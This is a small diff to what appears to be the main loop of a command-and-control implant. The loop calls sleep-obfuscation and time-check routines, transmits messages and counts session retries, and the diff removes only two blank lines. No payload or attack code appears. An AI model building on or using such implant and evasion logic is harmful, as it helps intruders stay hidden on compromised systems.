@@ -21,13 +21,11 @@ namespace Core {
 
         do {
             Opsec::SleepObf();
-
             if (!Opsec::CheckTime()) {
                 continue;
             }
 
             Message::MessageTransmit();
-
             if (ntstatus != ERROR_SUCCESS) {
                 Ctx->Session.Retry++;
 
